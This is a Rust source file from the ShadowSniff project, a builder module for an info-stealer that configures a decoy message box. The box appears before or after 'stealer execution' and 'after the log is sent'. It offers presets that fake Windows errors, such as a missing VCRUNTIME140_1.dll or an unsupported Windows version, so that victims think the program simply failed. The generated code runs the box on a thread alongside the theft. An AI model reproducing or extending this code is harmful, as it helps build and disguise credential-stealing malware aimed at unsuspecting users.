/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
use std::ffi::CString;
use std::fmt::{Display, Formatter};
use std::sync::Arc;
use inquire::{required, Confirm, InquireError, Select, Text};
use proc_macro2::{Literal, TokenStream};
use quote::quote;
use strum::IntoEnumIterator;
use strum_macros::{Display, EnumIter};
use windows::Win32::UI::WindowsAndMessaging::{MB_ABORTRETRYIGNORE, MB_CANCELTRYCONTINUE, MB_ICONERROR, MB_ICONINFORMATION, MB_ICONQUESTION, MB_ICONWARNING, MB_OK, MB_OKCANCEL, MB_RETRYCANCEL, MB_YESNO, MB_YESNOCANCEL};
use crate::{Ask, AskInstanceFactory, ToExpr};

#[derive(Copy, PartialEq, Clone, EnumIter)]
pub enum Show {
    Before,
    After
}

impl Display for Show {
    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
        match self {
            Show::Before => write!(f, "Before stealer execution"),
            Show::After => write!(f, "After stealer execution (after the log is sent)")
        }
    }
}

impl Ask for Show {
    fn ask() -> Result<Self, InquireError>
    where
        Self: Sized
    {
        Select::new(
            "When should the message box appear?",
            Show::iter().collect(),
        )
        .prompt()
    }
}

#[repr(u32)]
#[derive(Display, Copy, Clone, EnumIter)]
enum SourceIcon {
    Error = MB_ICONERROR.0,
    Warning = MB_ICONWARNING.0,
    Information = MB_ICONINFORMATION.0,
    Question = MB_ICONQUESTION.0
}

impl Ask for SourceIcon {
    fn ask() -> Result<Self, InquireError>
    where
        Self: Sized
    {
        Select::new(
            "Which icon should the message box display?",
            SourceIcon::iter().collect(),
        )
        .prompt()
    }
}

#[repr(u32)]
#[derive(Copy, Clone, EnumIter)]
enum SourceButton {
    Ok = MB_OK.0,
    OkCancel = MB_OKCANCEL.0,
    YesNo = MB_YESNO.0,
    YesNoCancel = MB_YESNOCANCEL.0,
    RetryCancel = MB_RETRYCANCEL.0,
    AbortRetryIgnore = MB_ABORTRETRYIGNORE.0,
    CancelTryContinue = MB_CANCELTRYCONTINUE.0
}

impl Ask for SourceButton {
    fn ask() -> Result<Self, InquireError>
    where
        Self: Sized
    {
        Select::new(
            "Which button layout should the message box use?",
            SourceButton::iter().collect(),
        )
        .prompt()
    }
}

impl Display for SourceButton {
    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
        match self {
            SourceButton::Ok => write!(f, "[OK]"),
            SourceButton::OkCancel => write!(f, "[OK] [Cancel]"),
            SourceButton::YesNo => write!(f, "[Yes] [No]"),
            SourceButton::YesNoCancel => write!(f, "[Yes] [No] [Cancel]"),
            SourceButton::RetryCancel => write!(f, "[Retry] [Cancel]"),
            SourceButton::AbortRetryIgnore => write!(f, "[Abort] [Retry] [Ignore]"),
            SourceButton::CancelTryContinue => write!(f, "[Cancel] [Try Again] [Continue]")
        }
    }
}

pub struct CustomSource {
    caption: String,
    text: String,
    icon: SourceIcon,
    button: SourceButton
}

impl Ask for CustomSource {
    fn ask() -> Result<Self, InquireError>
    where
        Self: Sized
    {
        let caption = Text::new("What should the message box caption be?")
            .with_validator(required!())
            .prompt()?;

        let text = Text::new("What should the message box text say?")
            .with_validator(required!())
            .prompt()?;

        let icon = SourceIcon::ask()?;
        let button = SourceButton::ask()?;

        Ok(Self {
            caption,
            text,
            icon,
            button
        })
    }
}

impl ToExpr for CustomSource {
    fn to_expr(&self, _args: ()) -> TokenStream {
        let text = Literal::c_string(CString::new(self.text.clone()).unwrap().as_c_str());
        let caption = Literal::c_string(CString::new(self.caption.clone()).unwrap().as_c_str());

        let (icon, button) = (self.icon as u32, self.button as u32);

        quote! {
            unsafe {
                windows_sys::Win32::UI::WindowsAndMessaging::MessageBoxA(
                    core::ptr::null_mut(),
                    #text.as_ptr() as _,
                    #caption.as_ptr() as _,
                    #button | #icon
                );
            }
        }
    }
}

#[derive(EnumIter)]
pub enum SourcePresets {
    NotSupported,
    VCRuntimeNotFound,
    Haram
}

impl Display for SourcePresets {
    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
        match self {
            SourcePresets::NotSupported => write!(f, "\"This program does not support the version of Windows your computer is running.\""),
            SourcePresets::VCRuntimeNotFound => write!(f, "\"The code execution cannot proceed because VCRUNTIME140_1.dll was not found. ...\""),
            SourcePresets::Haram => write!(f, "\"В вашем компьютере найден харам, Срочно нажмите ОК для превращение его в халяль.\"")
        }
    }
}

impl ToExpr for SourcePresets {
    fn to_expr(&self, _args: ()) -> TokenStream {
        let ok = MB_OK.0;
        let error = MB_ICONERROR.0;

        match self {
            SourcePresets::NotSupported => quote! {
                unsafe {
                    windows_sys::Win32::UI::WindowsAndMessaging::MessageBoxA(
                        core::ptr::null_mut(),
                        c"This program does not support the version of Windows your computer is running.".as_ptr() as _,
                        c"Error".as_ptr() as _,
                        #ok | #error
                    );
                }
            },
            SourcePresets::VCRuntimeNotFound => quote! {
                unsafe {
                    windows_sys::Win32::UI::WindowsAndMessaging::MessageBoxA(
                        core::ptr::null_mut(),
                        c"The code execution cannot proceed because VCRUNTIME140_1.dll was not found. Reinstalling the program fix this problem.".as_ptr() as _,
                        c"System Error".as_ptr() as _,
                        #ok | #error
                    );
                }
            },
            SourcePresets::Haram => quote! {
                unsafe {
                    windows_sys::Win32::UI::WindowsAndMessaging::MessageBoxA(
                        core::ptr::null_mut(),
                        c"В вашем компьютере найден харам, Срочно нажмите ОК для превращение его в халяль.".as_ptr() as _,
                        c"Ошибка".as_ptr() as _,
                        #ok | #error
                    );
                }
            }
        }
    }
}

impl Ask for SourcePresets {
    fn ask() -> Result<Self, InquireError>
    where
        Self: Sized
    {
        Select::new(
            "What preset should be used?",
            SourcePresets::iter().collect(),
        )
        .prompt()
    }
}

pub enum MessageBoxSource {
    Preset(SourcePresets),
    Custom(CustomSource)
}

struct CustomSourceFactory;
struct PresetFactory;

impl Display for CustomSourceFactory {
    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
        write!(f, "Custom")
    }
}

impl Display for PresetFactory {
    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
        write!(f, "Select from presets")
    }
}

impl AskInstanceFactory for CustomSourceFactory {
    type Output = MessageBoxSource;

    fn ask_instance(&self) -> Result<Self::Output, InquireError> {
        Ok(MessageBoxSource::Custom(CustomSource::ask()?))
    }
}

impl AskInstanceFactory for PresetFactory {
    type Output = MessageBoxSource;

    fn ask_instance(&self) -> Result<Self::Output, InquireError> {
        Ok(MessageBoxSource::Preset(SourcePresets::ask()?))
    }
}

impl Ask for MessageBoxSource {
    fn ask() -> Result<Self, InquireError>
    where
        Self: Sized
    {
        let factories: Vec<Arc<dyn AskInstanceFactory<Output = Self>>> =
            vec![Arc::new(PresetFactory), Arc::new(CustomSourceFactory)];

        Select::new("What message should be show?", factories)
            .prompt()
            .and_then(|x| x.ask_instance())
    }
}

impl ToExpr for MessageBoxSource {
    fn to_expr(&self, _args: ()) -> TokenStream {
        match self {
            MessageBoxSource::Preset(presets) => presets.to_expr(()),
            MessageBoxSource::Custom(source) => source.to_expr(())
        }
    }
}

pub struct MessageBox {
    pub show: Show,
    pub message: MessageBoxSource
}

impl ToExpr for MessageBox {
    fn to_expr(&self, _args: ()) -> TokenStream {
        let show = self.show;
        let message = self.message.to_expr(());

        if show == Show::After {
            return message;
        }

        quote! {
            unsafe {
                extern "system" fn _box(_: *mut core::ffi::c_void) -> u32 {
                    #message

                    0
                }

                windows_sys::Win32::System::Threading::CreateThread(
                    core::ptr::null_mut(),
                    0,
                    Some(_box),
                    core::ptr::null_mut(),
                    0,
                    core::ptr::null_mut(),
                );
            }
        }
    }
}

impl Ask for MessageBox {
    fn ask() -> Result<Self, InquireError>
    where
        Self: Sized
    {
        Ok(Self {
            show: Show::ask()?,
            message: MessageBoxSource::ask()?,
        })
    }
}

impl Ask for Option<MessageBox> {
    fn ask() -> Result<Self, InquireError>
    where
        Self: Sized
    {
        let r#use = Confirm::new("Do you want to show message box?")
            .with_default(false)
            .prompt()?;

        if !r#use {
            Ok(None)
        } else {
            MessageBox::ask().map(Some)
        }
    }
}